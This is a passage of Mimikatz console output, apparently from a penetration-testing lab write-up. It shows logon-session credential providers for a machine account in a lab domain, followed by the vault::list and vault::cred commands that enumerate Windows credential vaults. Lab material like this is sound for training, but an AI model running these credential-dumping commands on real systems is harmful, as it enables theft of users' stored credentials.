        tspkg :
        wdigest :
         * Username : HR-ERIKA$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : hr-erika$
         * Domain   : GCBHR.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Web Credentials
        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (0)

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
        Name       : Windows Credentials
        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault
        Items (0)

mimikatz(commandline) # vault::cred
TargetName : WindowsLive:target=virtualapp/didlogical / <NULL>
UserName   : 02xfjjmsvnesqvpf
Comment    : PersistedCredential
Type       : 1 - generic
Persist    : 2 - local_machine
Flags      : 00000000
Credential :
Attributes : 32
```


[back](./section4.html)
